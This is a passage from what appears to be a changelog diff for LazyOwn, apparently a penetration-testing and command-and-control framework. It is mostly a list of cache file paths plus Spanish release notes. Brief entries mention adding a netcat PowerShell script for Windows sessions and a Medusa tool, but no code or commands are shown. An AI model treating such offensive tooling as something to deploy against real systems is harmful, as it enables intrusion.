graphify-out/cache/ast/bb44196a47ff45b19e2080af1f536bf5ce9b901c9ed49032fc5cdceb3e43b836.json - graphify-out/cache/ast/bea4163e24cca7994a3f9d6fca6ebc080f5011c549c93f2f31b999a4f46267dc.json - graphify-out/cache/ast/beb434935dcdb68c665a94f161962a4a8f490bbbc0d096d60f3a3ebd0473857c.json - graphify-out/cache/ast/becd3f1ade4d59b6352e99f2d8d9a81a48dd40299cfe21e4bb2bbcd52a26f359.json - graphify-out/cache/ast/bf10badc48f7637b486595ff0f46c444b9fac7f33b511f278b655e61a589669d.json - graphify-out/cache/ast/bff401a076d22f98e0879dc00e97112cbc6880b1f649859ba24c67b8098ea93d.json - graphify-out/cache/ast/c1f759659c6ee726855f22612f77be27fc65bbe32f6cfe5dc11e6db7b2104867.json - graphify-out/cache/ast/c21958cc0ddcd669ea09f3686144e61be8e1e552d8e7cd43d820e0cb7f318bd9.json - graphify-out/cache/ast/c2cbc5951d0cea7f71174c2380b64b3551e21a8b3a67ef8102efe9bcce07dc44.json - graphify-out/cache/ast/c4c00aab4af0f2ae7d91e1bf1bf9c3ffd6d17b31756382119194a87f2bef48b8.json - graphify-out/cache/ast/c6473ab75666867a3f1b2e79369f3190400401ab7d1baf7cb256169352e5c97c.json - graphify-out/cache/ast/c69b687a84d62da00b8770839e32d717f95be997d2bbe158627edebd308755fb.json - graphify-out/cache/ast/c9c4c9abb353ea55c3a7bc268d0f54c55495bd69586b684b6306d58f37d30f41.json - graphify-out/cache/ast/ca9ed236e90bd12d76a1e257db65ad63ee6cd665ff729cf5eccf44f447aa8782.json - graphify-out/cache/ast/cb1987c4c95b3048cd2d7d3aeff690f5af8a91f9af509e35d9e1ef7e1c99f712.json - graphify-out/cache/ast/cb5d232748546d8e4ed4373c6f76b4f09bffc1ffe4191db4ddb2ff5cc0305bb7.json - graphify-out/cache/ast/cbef6add1f1c9eea0a5025d794c4ebf0cb3e613b78019ec2b2dcdca50e75d923.json - graphify-out/cache/ast/cf411a8e4114d4389c9c32b45a9d3d44d12e9c6965ec55e4676a4a1722957498.json - graphify-out/cache/ast/cfaaf36e22b025f69c07812416eb0de5188042268ca6ea2521e1e8b2e5d4336e.json - graphify-out/cache/ast/cffdc763ff215317b5aecc81f1ff967d7fe036ab8c1d5f55f689220988c2f95b.json - graphify-out/cache/ast/d02501c6cb69c60e13d8f51fa1263d89fd49eb22dbf8ee11e2af2ba7e121f951.json - graphify-out/cache/ast/d07d7983ef26719f801558bc44a3b0badc72262e363dcd99cd305457f1172b02.json - graphify-out/cache/ast/d0b712f31e46b7bde26122a85e6f381fac0d17710e4773f339f0dfdd105c1b1b.json - graphify-out/cache/ast/d19b3b870dec9cf3e7c54271f10b7768939d90af4cd976c0f17822e5e50b640a.json - graphify-out/cache/ast/d1eda78032799f16348449b2a70b8478f8efc7e74c0501ab5c79c472baaacc9c.json - graphify-out/cache/ast/d49837e314071df239cd427a607813f60fe18ebf9f37d7e861868f615cc96743.json - graphify-out/cache/ast/d4a867a77f9878e0f5267319ee107a189c9810d60ff683cb5f900369f2f97f44.json - graphify-out/cache/ast/d5e28cfa14053a1a565f219cda01761f34e90b046e1fd0e2eace80a4607afec4.json - graphify-out/cache/ast/d6c76f45844eab11e006d1bf3d1c92d220bc3158e658110ef133751e95d12eac.json - graphify-out/cache/ast/d770a3b716f10394eb597cafd13ddcab0084ae5291565cea789da7c56a79934c.json - graphify-out/cache/ast/d7f6d7eea030e67b9fb71873b6ff8c1c166efcbff1ff13b0f4a26c73fcb9cd51.json - graphify-out/cache/ast/d8d5134ff18bdbfb996240ae5227632001ca403926164934918c3aa0e7696c10.json - graphify-out/cache/ast/da98b4e277429a781df1c8e82cf2ebd672e0117138714556afe51cffb2db0f03.json - graphify-out/cache/ast/db7db008efc9d38360f44af05cb3594c68adb2d33bdeb7c7ecec4284e0e211f9.json - graphify-out/cache/ast/db995cf6eb791ef0fbdbcd4f070211c13514445897b7b2a204a421d3b8ea06f1.json - graphify-out/cache/ast/debfb245c2d633b8042993d4d9a12e4b5ea9cc2ce95a6b23243e8b8baec858ee.json - graphify-out/cache/ast/e15fe234e61a012f607518e5b33ad056b47b53f6da957f7dd517ab305a389fe8.json - graphify-out/cache/ast/e21b28a0f2ea374971116afa794f2aa3973ff0259503ee247fe2b4f9f4a5ecc2.json - graphify-out/cache/ast/e41bcd5111ae33e6b99d9b7744a670a84c32184d5b664e562dfc2b75f71d2e54.json - graphify-out/cache/ast/e8f0a7a3418de506b34cf98dcd66123fdf8676df257939133f99b7fca105e218.json - graphify-out/cache/ast/e962bddd92ab126ef205fc57e07a6f4bc3e10ea8ab7677b1dda79850bbef399e.json - graphify-out/cache/ast/ea55d63cce736cf0688fe0f78bef86919a8f39d330d8e52356c6c848620c7561.json - graphify-out/cache/ast/eb8893515eacc499c32493abdce2cb6076a15ea65441de29124badd9abba8945.json - graphify-out/cache/ast/ec3c08ef7ef01908d2e71f282ff8bdbc20dab798a6aa21b5b9f406eae2c5cc0a.json - graphify-out/cache/ast/ee0359cb4687a10436dac485d2681a38613671867aeb6f6955ae27e3082516de.json - graphify-out/cache/ast/ef330e83f7740b16d0168174eadefa14585907e41cbebfc972c765ecdbed893b.json - graphify-out/cache/ast/efc50a848ee2b3fb86e29f9e4578de5be10b77af5d3e468cb757db526877ebf5.json - graphify-out/cache/ast/f02006ba8be67b4ec2d3f5aa035c058f199f2206d915bd0b2aa0e09276b441ea.json - graphify-out/cache/ast/f0a28aa50b22b28c84b2157eab5b7ffa8dd2e1f19068642bdcf898a60d36fd0e.json - graphify-out/cache/ast/f14fb2e3d52422224b2f6830a9931715b64b3218226b439c0e1dbe25dce2a5ce.json - graphify-out/cache/ast/f2081897600a660e97e8cfdd541a055a2952e32567e01713c60d30861a733ebe.json - graphify-out/cache/ast/f3096eb153d6825dbd325459ed0487d5d364f020a91ec6dd0a89f37b221ab69c.json - graphify-out/cache/ast/f636ca779bb9981f1f7b970134cf6d60756b3c0663547dd96ab0107708c2d0c0.json - graphify-out/cache/ast/f76f80c2890d5a5f1c7def2e5e4321164827be72d238cae5d08f0cadd881f336.json - graphify-out/cache/ast/f79858c802ba2f0e1d784f1babc3fe40f4c13c6e7265744177b1b8a9d6d03279.json - graphify-out/cache/ast/f98d03401a04fcd6279b5f0d8884918e0300826bbc800c4825a6b2b40911e86c.json - graphify-out/cache/ast/fa3e0c8f9a619329058e029b9af38e30665053dbf171b10de66f21cf904851b3.json - graphify-out/cache/ast/fad6f7ec769bb1aacf11ae891ce8a6d39960ff5c8546d03a09df0d44baebe294.json - graphify-out/cache/ast/fbb3a72eb4fe27665cd1e47636e62f3b614299a20b29ddd221488f5575ba35a6.json - graphify-out/cache/ast/fc0c61a09be7db042d914bc3a4433b7c29f35276db1e931f7ce76753173c7133.json - graphify-out/cache/ast/fcaca6274055f064513b1038a780b96c7279519193d0b313f638451e4c7497d7.json - graphify-out/cache/ast/fd406a64d86541cc1e91e78ff9820510a3503c346aadd5e699a4017f8b586b77.json - graphify-out/cache/ast/fdf918a9c29989944b7feb62643b36e86e430036d449a39640dc51c976f0d56a.json - graphify-out/cache/ast/fee32e06cc5dafb9047245a7a3772120b3c79d66fb184a83a3c7adb24a1c425c.json - graphify-out/cache/b07d4946247ab741891fe6ad2c7e9510c74ee239d76bd30d3241e9e54ace29c9.json - graphify-out/cache/b0c3f3fab901413320a6806db7e65b03bb7b2b17f224039ffafec849614279c6.json - graphify-out/cache/b140a501a24a87dd076d954dce95dcaa9c8ca5639af84abd452a773c6af76802.json - graphify-out/cache/b1b8b49c63cccae65dd7154c8384f4e065b9edf7991ca23cf107643982121359.json - graphify-out/cache/b1cac1e5d06f4536e06cbb8632cb03b5de3be691f8790d44bf7f82bab0faff23.json - graphify-out/cache/b2005ba3885020ec786399785c6dad1317e6de2a116077e002f7c8f87aad79fc.json - graphify-out/cache/b23de439fd7c743455957d09a40f19e77ba2f3c09a2ebb3d5867a7e0ca6f9ea8.json - graphify-out/cache/b2677cffd1e091c7d5d6a2f51b1987be8180c42b0680a8405cfd1973a018c3c8.json - graphify-out/cache/b3475d3ecad80b81a44b9270d10c58f5b2dc2fc9de164c9a120315868362dd92.json - graphify-out/cache/b44d538e54b3e6c9db0336ec3f8984000ec9b00ebc51508a3397b47a0eac4deb.json - graphify-out/cache/b5097bef68d5f438263bdbb8c4c713b06b5d505209530384df66cc9f19070c4b.json - graphify-out/cache/b54c4a69a6713cf00b874e8131b2dba55ae4a6b16e92fff11af5abd2e2418b3a.json - graphify-out/cache/b613cd84bc8925389460beb6e544556078454c03150547513f11eb21ffd7ed38.json - graphify-out/cache/b615428268ebbcade0a56a2b489df6346f7a718f5e66df307441a5826f110eb2.json - graphify-out/cache/b75c122d0d579a4e932f19e079b43eb3c367f9acf532c0e22cfbe8cb0ed79ce5.json - graphify-out/cache/b7ed71cf39ffac46a64c7f5b44309f8d43f272e8faa25e3e67e56d040a5d35fd.json - graphify-out/cache/b9872512ddb7ee0059df881af07f116a85529afa1e6355af1f9f92b9940423b7.json - graphify-out/cache/ba04e12374406e2696edc10665202628eed4740a14517562eda2a9fbd105b276.json - graphify-out/cache/ba2569e05a00056fb483021bca1930d45289ebfbaac9de349bedf45db6344b3b.json - graphify-out/cache/bb44196a47ff45b19e2080af1f536bf5ce9b901c9ed49032fc5cdceb3e43b836.json - graphify-out/cache/bc1e9fde4bc97f5ab0becaf9c3cd99efb63371e4db13b3761f8801cf19089ff2.json - graphify-out/cache/bcba686ee5cd68350ae3e87aa8fc85fb27bfc900e576e4dd522acd5241bcfa82.json - graphify-out/cache/bea4163e24cca7994a3f9d6fca6ebc080f5011c549c93f2f31b999a4f46267dc.json - graphify-out/cache/becd3f1ade4d59b6352e99f2d8d9a81a48dd40299cfe21e4bb2bbcd52a26f359.json - graphify-out/cache/bf10badc48f7637b486595ff0f46c444b9fac7f33b511f278b655e61a589669d.json - graphify-out/cache/bff401a076d22f98e0879dc00e97112cbc6880b1f649859ba24c67b8098ea93d.json - graphify-out/cache/c01414d269f76729b537548c5c7694959fa3140582877c4eb68547707c54e1bc.json - graphify-out/cache/c10a715b5eb917009d7352af50a2abc9c89b4e1befb868806e8ff944b3232744.json - graphify-out/cache/c21958cc0ddcd669ea09f3686144e61be8e1e552d8e7cd43d820e0cb7f318bd9.json - graphify-out/cache/c27474cdb49c97823cf14e4a03063bcb70e689adedaf1b766e974e6bbcdb4ab4.json - graphify-out/cache/c2cbc5951d0cea7f71174c2380b64b3551e21a8b3a67ef8102efe9bcce07dc44.json - graphify-out/cache/c2f59cfa7f5b0446c0a98ee26eecefd0e1fe4d6cfe92c35b28091d0773fdd52b.json - graphify-out/cache/c3cc9078ec8d11637e942f6a310779395cde8f9c3be0cce66c67b7ddd591ad33.json - graphify-out/cache/c3fc30e0ce0946b17fe7d6c07f4ef0031b7fdf50992cb656dad927fbe7ea38e3.json - graphify-out/cache/c443e01a8d0e7833e04d086064ba835e460e9cfa113a9c24a66950d1ffc7c4dc.json - graphify-out/cache/c4f54afaed8f37a2b23109d498ff0f4601686907f8969928e556052f3d0ec1aa.json - graphify-out/cache/c53372c5679a51042ad05a577fc546f7321a205b3490721d2317b2e174ed7315.json - graphify-out/cache/c61599c56434925a50528b5912f71a72cdfce57c5b54f58cec6282f983412acc.json - graphify-out/cache/c6473ab75666867a3f1b2e79369f3190400401ab7d1baf7cb256169352e5c97c.json - graphify-out/cache/c69b687a84d62da00b8770839e32d717f95be997d2bbe158627edebd308755fb.json - graphify-out/cache/c79b29ea7700bc17192ca06233912b7c7aaf4c19f0af408adff479fd9dfff5e6.json - graphify-out/cache/c7b82847a2203ae17333916ea320365096bf37a779d506fe8326e5a08adf36c2.json - graphify-out/cache/c824fa38c1da3248d8b520fc9527b8e7168ef3b664a7dc5c2a4660d99c8d8ca0.json - graphify-out/cache/c8aebccac76d1091447132ade7decab4af44f4168b71e79bb6b2b92805073e65.json - graphify-out/cache/c91f76f3f004483a8ea2e0dd0b562a2923ef81a1fef1849e8ee30e570b3ed6e7.json - graphify-out/cache/c9c4c9abb353ea55c3a7bc268d0f54c55495bd69586b684b6306d58f37d30f41.json - graphify-out/cache/cb5d232748546d8e4ed4373c6f76b4f09bffc1ffe4191db4ddb2ff5cc0305bb7.json - graphify-out/cache/cbd2ce3419b9b3477a5140a3135478b500bba9cf3f1bea463b2665947d598e92.json - graphify-out/cache/cbef6add1f1c9eea0a5025d794c4ebf0cb3e613b78019ec2b2dcdca50e75d923.json - graphify-out/cache/cc35b6372751dadb23b55ca1ddca08f50d3b7bf74103e78a72123908cddc2bb1.json - graphify-out/cache/cf2acfa008dcc7798710b299c650ebcfd82670a2ba2cfe884e2fc46a48b9f84b.json - graphify-out/cache/cff8e2f98cf78e4dceefb6f966d992b2d8cc866f6d2309fb175713d1b39c242e.json - graphify-out/cache/d00abbda2dd000914d645445fd3c05eca5ddd4a0eb971159dc32175c1ba38bda.json - graphify-out/cache/d04e08435f37b9688bb3d4e458cd39a2bcc3adf98285191889cb4db1a7674728.json - graphify-out/cache/d07d7983ef26719f801558bc44a3b0badc72262e363dcd99cd305457f1172b02.json - graphify-out/cache/d0b071cb0074733f70452d126d2af227086159c886b6d994651458d17bfcbcd3.json - graphify-out/cache/d19b3b870dec9cf3e7c54271f10b7768939d90af4cd976c0f17822e5e50b640a.json - graphify-out/cache/d45b921cd88c5c19c18a4240f8269af0ce0ec0dfa474959ba631ce6b44d70927.json - graphify-out/cache/d4a867a77f9878e0f5267319ee107a189c9810d60ff683cb5f900369f2f97f44.json - graphify-out/cache/d5c475098f0db7d3ed40f040a7df86b77e590ff5b4efcaf57e489141965b3068.json - graphify-out/cache/d5e28cfa14053a1a565f219cda01761f34e90b046e1fd0e2eace80a4607afec4.json - graphify-out/cache/d6585f5dd592b761434a389e7692ec7ef8b8bcb15af9de64a10e74f80d82d4f4.json - graphify-out/cache/d6bcc60b82a67dbcc28ca450d90da7878e77cd236862f732c85e9e196ef973eb.json - graphify-out/cache/d6c76f45844eab11e006d1bf3d1c92d220bc3158e658110ef133751e95d12eac.json - graphify-out/cache/d750804e1fc3ab65f44236777c54d3d2e371378cdcc268378ad91b4ebba344bc.json - graphify-out/cache/d770a3b716f10394eb597cafd13ddcab0084ae5291565cea789da7c56a79934c.json - graphify-out/cache/d7b5ab2cc7c390d30de052056d0b6c62bc577a8d082bee2b9ba1eeb6d6eb8858.json - graphify-out/cache/d84a4995a3ecf22d156d7bbbc4637b756a90eceeeb9d06557fde4b1c91592924.json - graphify-out/cache/d8bf7baa7848f9988de7120fd0a0e116d2029f877e6f68014c78f9ca1b8a4e69.json - graphify-out/cache/d8d5134ff18bdbfb996240ae5227632001ca403926164934918c3aa0e7696c10.json - graphify-out/cache/da0dc8105ec59620e350c208806dfc697f7e8b4b2f49110b166785a26233db2d.json - graphify-out/cache/da503603ceb5972ece8f6e915fbc573e7f1b926129a51b938ad82e117d48c919.json - graphify-out/cache/da98b4e277429a781df1c8e82cf2ebd672e0117138714556afe51cffb2db0f03.json - graphify-out/cache/db7db008efc9d38360f44af05cb3594c68adb2d33bdeb7c7ecec4284e0e211f9.json - graphify-out/cache/db995cf6eb791ef0fbdbcd4f070211c13514445897b7b2a204a421d3b8ea06f1.json - graphify-out/cache/dbd0be8a71146ad169114c8627d0e1fa903b7c74461835a7018b878769d06c93.json - graphify-out/cache/dbd596061d289c9c6948559698175d01477d0326ca75f3fcb9a84560aa81860b.json - graphify-out/cache/dd2743ef1d5648b4b8fb91ee98e1330e67e4056020144ba71343feec458f2170.json - graphify-out/cache/dd4acc5fdb002647358394ee82a46a53e1e7de2e0509cb63a1a86c7d9ee6d40e.json - graphify-out/cache/de3874b1e5b228a6c8fed8d0842676149034719f5d04f98f4ed4fcbd1c193da0.json - graphify-out/cache/debfb245c2d633b8042993d4d9a12e4b5ea9cc2ce95a6b23243e8b8baec858ee.json - graphify-out/cache/e07885606f1ff7c2978dc29ffd60a2e5d282f35d09114b6466e445aeb19c24aa.json - graphify-out/cache/e0c2acd7a473d958b13c18212816f28b0424f51e996a1aab64dd5e52f5695f7f.json - graphify-out/cache/e0d796f71c7ad852b26537cdb1608910e37153fcf72a58e4535411b83fb2ebf7.json - graphify-out/cache/e15fe234e61a012f607518e5b33ad056b47b53f6da957f7dd517ab305a389fe8.json - graphify-out/cache/e1c9b6bd15be95be00bad53be5a795d15113182d092f6beb6b43549fc751a4d8.json - graphify-out/cache/e20c2d7f21a9baaa47544d8cbe0fb349998255837aeb3e0cd9584dd0cac255ba.json - graphify-out/cache/e3376d37b9dc667701e806ff38a436c686d04a81bd3831ac08e08f2fa3026c68.json - graphify-out/cache/e41bcd5111ae33e6b99d9b7744a670a84c32184d5b664e562dfc2b75f71d2e54.json - graphify-out/cache/e43b8c85844a5b8cf4729eddc86370839c43ede1fba93c248ec485eb9ad3119d.json - graphify-out/cache/e44e6c4320409546a5d72187c366aaf2e0bff56a08768f682ce2b506e54c2109.json - graphify-out/cache/e4adcb1a6b5e38074cb0c6aa57cf22f4abebf15b7fe6e8ab7953d73367f29684.json - graphify-out/cache/e4eee49992ca6e06b817e9b30156323dbbcc76fabb82ce53ec659905efac6508.json - graphify-out/cache/e4f15d7542d4a87b2d5125854f22016d016d0b5eb38135f64d3c50d36f5324ec.json - graphify-out/cache/e54ad4c779a70abc2abf1d529db3c3039042527914c9f356972fe20aa2c8d6ca.json - graphify-out/cache/e57d8d3ae7f30e0a6416ea62681decde5bb4eb4eb3f9cf795f80ea3d530dac3c.json - graphify-out/cache/e6dee7527043aae811c099beb7a7b60aed9d76bd5f232eb4eff0f72625613afc.json - graphify-out/cache/e6e5de103436d7199a234c90c1640eeeaee301905e1e38321342e2190f587e0d.json - graphify-out/cache/e7fc7eb453b0ebb99188225aa04dbd6a8e197bcf432a9f5c415002f7f8807f80.json - graphify-out/cache/e7fe755e0c70d265d8a16e61c528f35a80b4b7887b51bbd651c9377f5123d06f.json - graphify-out/cache/e84fd418710e6762c429326565748f3a6204dbc4bd809ce8af54116d87605b58.json - graphify-out/cache/e8f0a7a3418de506b34cf98dcd66123fdf8676df257939133f99b7fca105e218.json - graphify-out/cache/e97c570a893bc8648e3cc3313f46acee2c86bbc1fc403c868dd14353e9c5a4be.json - graphify-out/cache/ea00ce760eefd8c8b49b0c601dde610de820374f5c280971921a47c8836bb815.json - graphify-out/cache/ea2945e0b32f700ad1b66022d69886416e9d6dd064786b05a7b1aff26ad77981.json - graphify-out/cache/ea3ea6145e7a574be53e70b6d4d4ab76a78f58b9a2430f18ccab0a8ded53c420.json - graphify-out/cache/ec0d685aad2ce0db2cef6a48738bd8a01c1371c10b8bcc00c5b4910992bc5d8b.json - graphify-out/cache/ec241302d2a6b7f2712e6ce20902a515a2eb3840e1fa6d7537e74e9ad272c2c9.json - graphify-out/cache/ec2b19817e56fdd243f5ecab8798aead8d2750e580a37bc5db2e2980e40bad3f.json - graphify-out/cache/ec9287c7bc199be7b892cc9ede8c44bcd5ddac018b629d1ab38d95b31a7322c5.json - graphify-out/cache/ecd7b7152170fdf40c6c098588eaefb4abac29ec55786b6b6446eae53737ebc2.json - graphify-out/cache/ece08e23cddb5ecb404e25fb5ef2a63e8e97400308381bbe83d989c865ea3779.json - graphify-out/cache/ee0359cb4687a10436dac485d2681a38613671867aeb6f6955ae27e3082516de.json - graphify-out/cache/ee304cda905c2891fa9b241f56be103bfd18be1c8795332c6ac45870cca2df43.json - graphify-out/cache/ef330e83f7740b16d0168174eadefa14585907e41cbebfc972c765ecdbed893b.json - graphify-out/cache/ef39c6d498f19a9ef495c8fc82cd7abc0ac52ed97bb81ceb00cf4456c5d25404.json - graphify-out/cache/ef49c52dbf431ab2d70b9aed1b4a384e3435fdfc8324d8405fa453096e7d8a9b.json - graphify-out/cache/ef6183d17efb4a952e9e0bf425dd5fb73ac89a9e5429468d0d3ad0f5c56106f6.json - graphify-out/cache/ef6dca8178782ca3d5f3f0a47d8849ddd4ff70fff67c23aab7681c103cf77b63.json - graphify-out/cache/efc50a848ee2b3fb86e29f9e4578de5be10b77af5d3e468cb757db526877ebf5.json - graphify-out/cache/f00656fc0be2ab37a222f05753f0136e9629be96814c35fe133921097b07f6d7.json - graphify-out/cache/f02006ba8be67b4ec2d3f5aa035c058f199f2206d915bd0b2aa0e09276b441ea.json - graphify-out/cache/f14fb2e3d52422224b2f6830a9931715b64b3218226b439c0e1dbe25dce2a5ce.json - graphify-out/cache/f204ffc6ff8762b63fb901d96755f240f4db3578b14ee6e05c827a38ca308665.json - graphify-out/cache/f2081897600a660e97e8cfdd541a055a2952e32567e01713c60d30861a733ebe.json - graphify-out/cache/f2b386b2d70fcd89d02e3507c83d8087ca38c7d4c80f1aeea37b323855f2cc40.json - graphify-out/cache/f2cf2e723b1ec0c90e01b8711c17a3b855d26f2256841ee10549f51fdbdf16ec.json - graphify-out/cache/f2f3186fe479650bc8fd20b014e256a68a89bb334d45de2c5bc48bfeb1dff655.json - graphify-out/cache/f4523778cf895cbef6bcdbcf8080a1cb757438280a9e7461b855dbc924df378f.json - graphify-out/cache/f5885206484985e3559b93506b8440446556ef96aefe691483c759723b449389.json - graphify-out/cache/f636ca779bb9981f1f7b970134cf6d60756b3c0663547dd96ab0107708c2d0c0.json - graphify-out/cache/f79858c802ba2f0e1d784f1babc3fe40f4c13c6e7265744177b1b8a9d6d03279.json - graphify-out/cache/f7d52ccc43a1e9f751159a402fc84e2dd7bfdb5a97fed4b545e76eb2338d67ca.json - graphify-out/cache/f7d7b733876364889d31c3d9f24651d8f2e3c497d005a188f08786ad4782f445.json - graphify-out/cache/f81755662b01beb9e93dac2ff05d4dd4e53d5cab41d50ef19e53fce66feb1556.json - graphify-out/cache/f90f2cd6e0587e521f667a81a051de099c42120b7d83e053a1d664a2c1c5e950.json - graphify-out/cache/f98d03401a04fcd6279b5f0d8884918e0300826bbc800c4825a6b2b40911e86c.json - graphify-out/cache/fa56ed511e68340fe3f838ea2ece4bc2a3d7d2671e902322aec2d85480e7963e.json - graphify-out/cache/fad6f7ec769bb1aacf11ae891ce8a6d39960ff5c8546d03a09df0d44baebe294.json - graphify-out/cache/fb6d6b96decc9d8fa8c425d47e1e1f83bfde36074a248510fc9dfccfa1355cc1.json - graphify-out/cache/fc0db0f9dcc6385b64f69c86d6d6058d39e8edaa84e1ff8e790c500bf84b1f9a.json - graphify-out/cache/fc571dc7c97731951dbac601713355171d64db237a6edf96326076fef23d8087.json - graphify-out/cache/fc63e31dbe1e63ff9adabd972ccd02f50a9e288ccddc02afc2f022c9eb7460f1.json - graphify-out/cache/fcaca6274055f064513b1038a780b96c7279519193d0b313f638451e4c7497d7.json - graphify-out/cache/fd3a692a21a518650bf6bbdf721cdc372c3494866b0eea7721d1a0d37126dfd3.json - graphify-out/cache/fd406a64d86541cc1e91e78ff9820510a3503c346aadd5e699a4017f8b586b77.json - graphify-out/cache/fded71764e7e40358ebaf8338813efc0c672a041e78cec1a1de4b970c8a14437.json - graphify-out/cache/fe75084a6303d81f2352c2e2d349e38e67f55502b56b8f19cf75fc2e5dd4b540.json - graphify-out/cache/fee32e06cc5dafb9047245a7a3772120b3c79d66fb184a83a3c7adb24a1c425c.json - graphify-out/cache/ff00fde113af6de929b45a2f970401c4ed7d0d4f60216c3f93776412827cdea4.json - graphify-out/cache/ff8cc9d97a8d6c6c4dfb1e0ccaaae5b5f28e22943f28b80e8ee7fa72613e216f.json - graphify-out/cache/ffbe455ef52e7909f91068fde89c81c6ad2bc373ccd5c742c33eb95049dafc83.json - graphify-out/cache/stat-index.json\nCreated file(s):\n- core/dependencies.py - tests/test_dependencies.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mar 09 jun 2026 22:38:59 -04 \n\n Hora: 1781059139
 
-## [0.1.5]
 
-### Added
+### Otros
 
-- test(testing Changelog): new method to create changelog
+### Otros
 
-### Changed
+  *   * updating main
 
-- se crea el comando y el directorio lazyscripts el cual recive como parametro un nombre de chivo
 
-## [0.1.4]
+### Correcciones urgentes
 
-## [0.1.3]
+### Otros
 
-### Changed
+  *   * hotfix(hotfix): in recon command ss now work propertly \n\n Version: release/0.2.151 \n\n with lvoe \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 07 jun 2026 23:12:51 -04 \n\n Hora: 1780888371
 
-- nuevo tool a pwntomate medusa.tool
 
-## [0.1.2]
+### Refactorización
 
-### Changed
+### Otros
 
-- nueco comando
+  *   * refactor(refactor): some love to security issues \n\n Version: release/0.2.149 \n\n Versiones de corrección confirmadas contra la base OSV (vía pip-audit sobre el entorno real, no a ojo): \n\n Modified file(s):\n- core/payload_schema.py - lazyc2.py - lazyown.py - modules/lazyown_metaextract0r.py - pyproject.toml - requirements.txt - templates/surface_live.html - tests/test_improvements_spec.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: dom 07 jun 2026 13:50:59 -04 \n\n Hora: 1780854659
 
-## [0.1.1]
 
-### Changed
+### Otros
 
-- reload
-- reload the history deleted by error holly git :P
-- versionamiento
-- command
-- changelog
-- tipo release
+### Otros
 
-### Fixed
+  *   * update pp
 
-- fix
-- fix en los tags
-- fix(version file):
-- fixin bug in formating of changelog
-- fixing semantic version
 
-## [0.1.0]
+### Refactorización
 
-### Added
+### Otros
 
-- creating new tag
-- new library
-- feat(semantic versioning): se implementa el versionamiento semantico utilizando el archivo versions.json y git en el archivo DEPLOY.sh
-- testing deploy feature and semantic versioning
-- feat(add scripts): - adding scripts on sessions/win directory a nc ps1 version
-- feature(cambios en script fast_run_as_r00t.sh): se agrega la opción --vpn <NUM> para poder elegir parametricamente que vpn se elije para la ejecucion
-- feature(actualizador de readme.md): con los nuevos cambios desde los scripts que generan documentaciòn
-- feature(versionamiento semantico en script de deploy): mejora en DEPLOY.sh con versionamiento semantico
-- feature(parametrizar el despliegue): se agrega el parametro --no-test para despliegues que no involucren cambios en la tool
-- feature(nuevo creador de index.html): crea el html de manera automatizada con el script index.sh
-- feature(mejora CHANGELOG.sh): ahora actualiza usando readmeneitor.py
+  *   * refactor(refactor): some improvements in the code and graphify \n\n Version: release/0.2.148 \n\n with love \n\n Modified file(s):\n- CLAUDE.md - COMMANDS.md - QUICKSTART.md - README.md - cli/README.md - cli/command_index.json - cli/scope_guard.py - core/payload_schema.py - docs/COMMANDS.html - graphify-out/GRAPH_REPORT.md - graphify-out/cache/01702100c0971042314c03d56fff92cb25988d38c432a42fecc61c786bc8ade6.json - graphify-out/cache/032c16c926dfb9ca396b8ad6a0e3a90242faa5255f45ba81633645d1bcad47d2.json - graphify-out/cache/04645e2e40ed867c620396c786c886965ce85dc0fa31f4810fe47fc440faa14f.json - graphify-out/cache/0629fca57b461f18881d90550cafae11789e45d50b5a59a1c90cc281bf629edc.json - graphify-out/cache/07de6a9f9d0654633dd3a76d3807a1347328e13ef77f4dc7e5a0f89fd1354d30.json - graphify-out/cache/083ce22dd3b6c00d45e3f54a378bfd741d15263d149dc7514d42f28cccb84e20.json - graphify-out/cache/08fefb331b7de4cead158721c8ec6ec430b920afbea4757912fc34657ab9abb6.json - graphify-out/cache/09cd042a93c9bf9ed60a6c8d930b86358f21f334b9e356cd51e87e52ab43d0bb.json - graphify-out/cache/0abad2644a5f511f96d078ff2a01781d69f1abdae30017998a9a42aa95a18147.json - graphify-out/cache/0c9ae1e0169642d6b4d2d1651593143763105b71ac178261421724227c344d1d.json - graphify-out/cache/0d76b6b608eb14bbe5ae7aea9f6c9437c4adecedac1becff937a53c194d9725f.json - graphify-out/cache/0de7abbb28d167d385adb5dd6c40d99c6b86158bc6c4b188043c244025b0dabc.json - graphify-out/cache/0f3ff7b3a03d44dd45fa7190c64678587a43e3cd6490f157db914d6fe512e875.json - graphify-out/cache/0fbaab041e40558ee9af714137294f1d754d7b06cd8b4062ba4ec1981ed3b0c4.json - graphify-out/cache/10329627ec939c8b33e2f5ad77e9899343f6c7e75ccd777fea5b6bf39543c504.json - graphify-out/cache/115b3c9a01e927ccbb7622d251aa15ba6c688f43245671fa5ee557926f5f1b82.json - graphify-out/cache/117e8a6e6898720deb979a8c69db0fe2f631487cd631fd5c9ec5383604d2851f.json - graphify-out/cache/11ec92d92b7022932e78a3c107c931606034d00708715a32347eb82139f6efb6.json - graphify-out/cache/128fb0e4b6c348f78fc80fc6f0e9d122608298e3bca713fa6588f3485c07061d.json - graphify-out/cache/12c9035dd419ffe143299ae803cde3d88d9cca4e6a0485b7e55bb0b18270263e.json - graphify-out/cache/15bde2576b1b79f628e4c0411e168884bcfcc5d9deaa827addce26d405ad8c8c.json - graphify-out/cache/15eb590c0b6a406aaf11216d2c39eb939721a91e9da4a3cf4e5ad8d35df88930.json - graphify-out/cache/15f1f3292a40bd89d9580e511d8e26957c73af8c60b3d691412706284c99405d.json - graphify-out/cache/18ec83e69c0ecb8deebacdf718852b43f030bf133a27c6e99af66b7ec3c7d261.json - graphify-out/cache/19f72a55569c1a0c1a19fc606c457fce89a776b345c834efe34f392e0858f537.json - graphify-out/cache/1b7a65dfeadf5e7413ea3ebceb5813accdccec0193b301296024aaba2b775ede.json - graphify-out/cache/1d58ee8529e84340e47ce550c2088c1ea7463ee7d624e29824c259a360166262.json - graphify-out/cache/1d9d24f4f55222d937e86530610cee03b6d9467e2d03f12a2b52637ce85eab9d.json - graphify-out/cache/1db495b3bdcfbc5249ba3159094dc6d88792c7b0547b6f28dcd57933d989425c.json - 